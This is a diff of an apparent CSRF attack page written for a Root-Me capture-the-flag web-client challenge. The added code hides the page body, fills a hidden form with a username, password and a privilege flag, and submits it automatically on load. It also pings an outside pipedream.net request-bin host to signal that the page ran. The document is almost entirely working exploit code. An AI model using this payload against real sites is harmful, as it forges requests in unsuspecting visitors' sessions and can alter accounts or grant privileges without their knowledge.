@@ -1,14 +1,23 @@
- 
+<style>
+  /* Rends tout le body invisible */
+  body { display:none; }
+</style>
 
-<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
-  <input type="text" name="username" value="tonioshast">
-  <input type="checkbox" name="status" value="on" checked>
+<form id="f"
+      action="http://challenge01.root-me.org/web-client/ch22/?action=register"
+      method="POST">
+  <input type="hidden" name="username" value="tonioshast">
+  <input type="hidden" name="password" value="tonioshast">
+  <input type="hidden" name="status_profile" value="1">
 </form>
+
 <script>
-  // Coche + ping enchaîné
-  let cb = document.querySelector('input[name="status"]');
-  cb.checked = true;
-  new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ts=" + Date.now();
-  setTimeout(()=>document.forms[0].submit(), 300);
+  
+  // Soumission automatique une fois la page complètement chargée
+  window.onload = () => {
+    new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ts=" + Date.now();
+    document.getElementById('f').submit();
+  };
 </script>
+ 
 
